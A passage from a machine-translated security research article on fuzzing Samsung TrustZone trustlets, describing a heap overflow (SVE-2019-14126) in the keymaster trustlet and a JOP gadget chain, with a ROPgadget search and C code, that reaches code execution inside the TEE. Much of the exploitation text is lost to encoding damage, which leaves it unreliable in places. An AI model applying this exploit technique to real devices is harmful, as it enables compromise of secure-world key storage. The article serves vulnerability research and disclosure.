√† une utilisation en mode automatique sur de nombreux fichiers.  Et nous n'avons pas eu le temps d'essayer Frida.  Si quelqu'un avait de l'exp√©rience avec Linux sur ARM, √©crivez vos impressions dans les commentaires. </p></div></div><br><p>  Comme vous pouvez le voir, nous ne pouvons nous contenter que du d√©bogueur.  Mais l'utilisation de scripts pour gdb m√™me cela simplifie d√©j√† consid√©rablement notre travail. </p><br><div class="spoiler">  <b class="spoiler_title">Probl√®me n ¬∞ 5: fonctions de biblioth√®que</b> <div class="spoiler_text"><p>  Un autre probl√®me qui √©tait clair d√®s le d√©part √©tait les fonctions de biblioth√®que utilis√©es par le trastlet.  Nous les avons remplac√©s par des stubs, √† l'exception des fonctions qui peuvent √™tre remplac√©es par des fonctions similaires de libc.  De toute √©vidence, si dans la logique du trastlet un code traite le r√©sultat de l'une de ces fonctions de stub, il est tr√®s probable qu'il se bloque du fait qu'il attend des donn√©es compl√®tement diff√©rentes, et cela ne signifie pas n√©cessairement une erreur dans le code. </p><br><p>  Il y a pas mal de fonctions pour lesquelles il n'est pas si facile de simuler le comportement d'une fonction r√©elle: </p><br><ul><li>  tlApiSecSPICmd; </li><li>  tlApi_callDriver; </li><li>  tlApiWrapObjectExt; </li><li>  tlApiUnWrapObjectExt; </li><li>  tlApiCipherDoFinal; </li><li>  tlApiSignatureSign; </li><li>  ... </li></ul><br><p>  Afin de ne pas perdre de temps √† √©tudier de tels cas douteux, nous avons tout simplement d√©cid√© de ne pas consid√©rer les cas de test qui utilisent ces fonctions. </p></div></div><br><h2 id="rezultaty-fazzinga">  R√©sultats flous </h2><br><p>  En mode automatique, √† l'aide de scripts, nous avons collect√© les informations suivantes sur tous les trustlets: </p><br><ul><li>  UID Traidlet </li><li>  identifiant de crash; </li><li>  type d'erreur (type de signal lors d'un crash); </li><li>  L'adresse o√π l'erreur se produit </li><li>  Fonctions API utilis√©es par le trastlet. </li></ul><br><p>  En fin de compte, il est tr√®s pratique de mettre toutes ces informations dans la base de donn√©es, puis de s√©lectionner les cas les plus int√©ressants pour l'analyse par des requ√™tes SQL et d'ajouter des informations en fonction des r√©sultats de l'analyse. </p><br><p><img src="https://habrastorage.org/webt/k_/uk/mm/k_ukmmhlewkiem_fvzwfms-eiai.png"></p><br><p>  Par exemple, avec cette requ√™te, vous pouvez afficher tous les cas de test sur lesquels l'erreur de panne de segmentation se produit: </p><br><pre> <code class="plaintext hljs">select * from main where type = "SIGSEGV";</code> </pre> <br><p>  Et filtrez les cas de test qui utilisent la fonction <code>tlApiSecSPICmd</code> , que nous avons impl√©ment√©e comme stub: </p><br><pre> <code class="plaintext hljs">select * from main where api not like "tlApiSecSPICmd";</code> </pre> <br><p>  Ainsi, des erreurs de diff√©rents types ont √©t√© trouv√©es dans tous les trustlets.  Certains d'entre eux n'ont pas conduit √† des vuln√©rabilit√©s, mais il y en a qui sont des vuln√©rabilit√©s et peuvent √™tre utilis√©es par un attaquant.  Consid√©rez la plus int√©ressante des vuln√©rabilit√©s trouv√©es. </p><br><h2 id="sve-2019-14126">  SVE-2019-14126 </h2><br><p><img src="https://habrastorage.org/webt/ji/zy/hr/jizyhrbu1vcna9da47r_s0dmjdy.png"></p><br><p>  La vuln√©rabilit√© a √©t√© trouv√©e dans le trustlet keymaster du code de traitement du contenu du tampon TCI lors de l'analyse de la structure ASN.1 cod√©e selon les r√®gles DER.  Deux champs de cette structure sont utilis√©s comme dimensions: l'un lors de l'allocation de m√©moire dynamique et l'autre lors de sa copie.  √âvidemment, si la deuxi√®me taille est plus grande que la premi√®re, un d√©bordement de tas se produit.  De telles vuln√©rabilit√©s conduisent g√©n√©ralement √† la possibilit√© d'ex√©cution de code par un attaquant, nous avons donc essay√© de faire un exploit √† part enti√®re pour cette vuln√©rabilit√©.  Lors de l'√©valuation de la possibilit√© d'exploitation, il faut √©galement prendre en compte toutes les restrictions des trusts √©num√©r√©es ci-dessus. </p><br><p>  Ayant sous la main un d√©bordement de pile et sur la base de ces restrictions, on peut imaginer la strat√©gie d'op√©ration suivante: </p><br><ol><li>  trouver un pointeur de fonction dans un endroit accessible pour la r√©√©criture, par exemple, dans la section .bss; </li><li>  √Ä l'aide du d√©bordement trouv√©, cr√©ez un bloc de m√©moire de tas √† cet endroit; </li><li>           ; </li><li>      . </li></ol><br><p>   , ,    ,       Kinibi.      -      mclib,          <a href="https://downloads.immunityinc.com/infiltrate2019-slidepacks/eloi-sanfelix-exploiting-trusted-apps-in-samsung-tee/TEE.pdf"> </a>   ZeroCon,   . </p><br><p>     ‚Äî        .bss.            ,   .bss       .               , ,  ,    ,       . </p><br><p><img src="https://habrastorage.org/webt/l8/ng/jb/l8ngjbgjfox8nubn0ipgjmay70s.jpeg"></p><br><p>  ,       .bss,      . </p><br><p>        ,      . ,       ,    ,    ,       .bss,   .     <em></em>     code-reuse. </p><br><p>     ROP. ,    ROP,            .bss.      ,      ,          .   ,     ,             .     , , ,   . </p><br><p>  ROP,    JOP. JOP ‚Äî  Jump Oriented Programming.  JOP            . </p><br><p>     JOP ,    ROPGadget.     ,     JOP,      : </p><br><pre> <code class="plaintext hljs">ROPgadget --binary tlrun --thumb --range 0x1000-0xbeb44 | grep -E "; b.+ r[0-9]+$"</code> </pre> <br><p>  !       . </p><br><p><img src="https://habrastorage.org/webt/ti/oz/96/tioz96g4dhzaugtxtlr0d4sq4cc.png"></p><br><p>       .  ROP             .  ,  ROP-   <a href="https://en.wikipedia.org/wiki/Weird_machine">weird machine</a> ,    .   JOP     ,          .   ARM,      ,  ,     ‚Äî LDMIA (Load Memory Increment Address). </p><br><p><img src="https://habrastorage.org/webt/i6/vm/pu/i6vmpufz2lpz6aoeapmujzc7xa0.png"></p><br><p>      ,  ,         ,   ,   .         ,            .        JOP! </p><br><p>       LDMIA   . - capstone,    ROPGadget,     LDMLO. </p><br><p><img src="https://habrastorage.org/webt/hm/5l/vi/hm5lvigl8qx96w_xtjasd2ngeie.png"></p><br><p>    !   .         ,         ,  .   stack cookie  ,    . </p><br><pre> <code class="plaintext hljs">*(int*)&amp;mem1[offset] = SUPER_GADGET; // r2 *(int*)&amp;mem1[offset + 4] = 0; // r3 *(int*)&amp;mem1[offset + 8] = 0; // r4 *(int*)&amp;mem1[offset + 12] = SUPER_GADGET; // r5 *(int*)&amp;mem1[offset + 16] = 0x9560b; // r7 offset += 0x14; *(int*)&amp;mem1[offset] = 0; // r2 *(int*)&amp;mem1[offset + 4] = 0; // r3 *(int*)&amp;mem1[offset + 8] = 0; // r4 *(int*)&amp;mem1[offset + 12] = 0; // r5 *(int*)&amp;mem1[offset + 16] = 0x96829; // r7 offset += 0x14; *(int*)&amp;mem1[offset] = SUPER_GADGET; // r2 *(int*)&amp;mem1[offset + 4] = 0; // r3 *(int*)&amp;mem1[offset + 8] = 0x3d5f4; // r4 *(int*)&amp;mem1[offset + 12] = mapInfo3.sVirtualAddr; // r5 *(int*)&amp;mem1[offset + 16] = 0x218c7; // r7</code> </pre> <br><p> Hello, world       . </p><br><pre> <code class="plaintext hljs">strcpy(mem3 + 0x100, "Hello world from TEE!\n"); *(int*)&amp;mem1[offset] = 0x7d081b1; // r2 *(int*)&amp;mem1[offset + 4] = 0; // r3 *(int*)&amp;mem1[offset + 8] = mapInfo3.sVirtualAddr + 0x100; // r4 *(int*)&amp;mem1[offset + 12] = 0; // r5 *(int*)&amp;mem1[offset + 16] = 0x9545b; // r7</code> </pre> <br><p><img src="https://habrastorage.org/webt/qt/ay/jo/qtayjouk0l2xu35tl2v2faovzlw.png"></p><br><p>  "Hello, world!"   , , ,   keymaster, ,   .        ,     . ,  <a href="http://bits-please.blogspot.com/2016/06/extracting-qualcomms-keymaster-keys.html"> </a> Gal Beniamini  TEE Qualcomm         ,  ,  offline-     Android.          TEE OS     EL-3,         . </p><br><h2 id="zaklyuchenie">  Conclusion </h2><br><p> ARM TrustZone             ,            .     Secure World         Android,              .  , , Samsung   <a href="">bug bounty</a>      TrustZone,     . </p><br><p><img src="https://habrastorage.org/webt/ai/rq/ii/airqiifvmexik-gscxzzpu1ohbo.png"></p><br><p>      AFL  qemu,         ""  .            .              ,        .     ! </p><br><h2 id="poleznye-ssylki">  Liens utiles </h2><br><ul><li> <a href="https://blog.quarkslab.com/reverse-engineering-samsung-s6-sboot-part-i.html">Reverse Engineering Samsung S6 SBOOT</a> </li><li> <a href="https://medium.com/taszksec/unbox-your-phone-part-i-331bbf44c30c">Unbox Your Phone</a> </li><li> <a href="https://googleprojectzero.blogspot.com/2017/07/trust-issues-exploiting-trustzone-tees.html">Trust Issues: Exploiting TrustZone TEEs</a> </li><li> <a href="https://downloads.immunityinc.com/infiltrate2019-slidepacks/eloi-sanfelix-exploiting-trusted-apps-in-samsung-tee/TEE.pdf">TEE Exploitation: Exploiting Trusted Apps on Samsung's TEE at Zer0con 2019</a> </li><li> <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Peterlin-Breaking-Samsungs-ARM-TrustZone.pdf">BREAKING SAMSUNG'S ARM TRUSTZONE at BlackHat USA 2019</a> </li><li> <a href="https://cfp.recon.cx/reconmtl2019/talk/DYGNJQ/">The road to Qualcomm TrustZone apps fuzzing</a> </li><li> <a href="http://allsoftwaresucks.blogspot.com/2019/05/reverse-engineering-samsung-exynos-9820.html">Reverse-engineering Samsung Exynos 9820 bootloader and TZ</a> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr478948/">https://habr.com/ru/post/fr478948/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr478928/index.html">Python ou pas Python</a></li>
<li><a href="../fr478930/index.html">Comment utiliser MySQL sans mot de passe (et risques de s√©curit√©)</a></li>
<li><a href="../fr478932/index.html">Docker pour le front-end. Partie 1. Pourquoi?</a></li>
<li><a href="../fr478934/index.html">Le module de biblioth√®que standard Python le plus utile que tout le monde oublie constamment</a></li>
<li><a href="../fr478942/index.html">Grande exp√©rience porno: l'histoire d'Internet pour les adultes</a></li>
<li><a href="../fr478950/index.html">Les r√©sultats de la semaine: Huawei s'adapte aux sanctions, Poutine signe des lois sensationnelles et en Russie, il bloque ShutterStock</a></li>
<li><a href="../fr478952/index.html">Un mois avec Onyx Boox Note Pro</a></li>
<li><a href="../fr478954/index.html">RE: Peur et d√©go√ªt en informatique</a></li>
<li><a href="../fr478956/index.html">Pr√©sentation de 3CX V16 Update 4 Beta avec un client VoIP Chrome et une application vid√©o pour Android</a></li>
<li><a href="../fr478958/index.html">Guide de mise √† niveau complet de Windows 10 pour les entreprises de toute taille</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>